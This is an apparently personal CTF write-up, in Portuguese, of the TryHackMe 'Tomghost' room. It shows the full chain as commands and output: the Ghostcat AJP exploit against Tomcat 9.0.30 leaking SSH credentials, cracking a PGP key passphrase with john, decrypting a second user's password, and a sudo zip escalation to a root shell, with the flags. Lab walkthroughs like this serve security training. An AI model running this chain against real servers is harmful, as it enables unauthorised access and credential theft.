# Tomghost

export IP="10.10.236.55"


# 1.nmap

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
```

Identificado que há instalado um Apache Tomcat, na versão 9.0.30, que possui uma vulnerabilidade conhecida, chamado "Ghostcat" (CVE-2020-1938).


# 2. Exploit

Encontrado exploit para essa vulnerabilidade tanto standalone, quanto disponível no metasploit.

```
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                             | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                               | multiple/webapps/49039.rb
-------------------------------------------------------------------------------------------------------------- ---------------------------------

```

Execução oe exploit e descoberto o usuário e a senha do SSH de um dos usuários.

```
python 48143.py 10.10.236.55
Getting resource at ajp13://10.10.236.55:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

```

Identificado dois arquivos "credential.pgp" e "tryhackme.asc".

Necessário descriptografar os arquivos para pegar as próximas credenciais.


# 3. Privilege Escalation (lateral)

 Baixado os arquivos localmente.

```
sudo scp skyfuck@10.10.236.55:/home/skyfuck/* .
[sudo] senha para joao: 
skyfuck@10.10.236.55's password: 
credential.pgp                       100%  394     1.3KB/s   00:00    
tryhackme.asc                        100% 5144    12.2KB/s   00:00  
```
Agora é necessário, conseguir a chave secreta para importação do arquivo pgp/asc.

```
sudo gpg2john tryhackme.asc > /tmp/hash.txt

cat hash.txt 
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

sudo john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2021-04-30 15:43) 7.692g/s 8246p/s 8246c/s 8246C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Com a chave "alexandru", podemos fazer a importação do arquivo "pgp" e capturar as credenciais do outro usuário.

```
sudo gpg --import tryhackme.asc 
[sudo] senha para joao: 
gpg: chave 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" não mudada
gpg: chave 8F3DA3DEC6707170: chave secreta importada
gpg: chave 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" não mudada
gpg: Número total processado: 2
gpg:              não modificados: 2
gpg:       chaves secretas lidas: 1
gpg:   chaves secretas importadas: 1

sudo gpg --decrypt credential.pgp 
gpg: AVISO: algoritmo de cifragem CAST5 não foi encontrado nas preferências do destinatário.
gpg: criptografado com 1024-bit ELG chave, ID 61E104A66184FBCC, criado 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
Capturado as credenciais do outro usuário:
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

Captura do a flag de usuário.

```
sudo ssh merlin@10.10.236.55
merlin@10.10.236.55's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ 
merlin@ubuntu:~$ ls
user.txt
merlin@ubuntu:~$ cat user.txt
THM{GhostCat_1s_so_cr4sy}

```

# 4. Privilege Escalation (root)

Identificado que há um aplicativo do zip com permissões de root.

```
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Efetuado a escalação de privilégios conforme a documentação abaixo e capturado a flag de root.
https://gtfobins.github.io/gtfobins/zip/

```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```